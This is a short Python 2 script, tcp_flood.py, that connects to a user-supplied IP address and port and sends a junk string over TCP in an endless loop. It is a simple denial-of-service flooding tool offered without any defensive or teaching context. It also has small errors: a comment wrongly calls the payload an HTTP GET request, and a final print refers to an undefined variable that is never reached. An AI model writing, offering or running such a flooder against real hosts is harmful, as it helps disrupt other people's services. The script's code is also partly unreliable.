import sys
import socket

if len(sys.argv) != 3:
	print "Usage: python tcp_flood.py <IP> <PORT>"
	sys.exit(1)

# create an ipv4 (AF_INET) socket object using the tcp protocol (SOCK_STREAM)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect the client
# client.connect((target, port))
client.connect((sys.argv[1], int(sys.argv[2])))

# send some data (in this case a HTTP GET request)
while 1:
	client.send('floooooooooooood\n')


print response
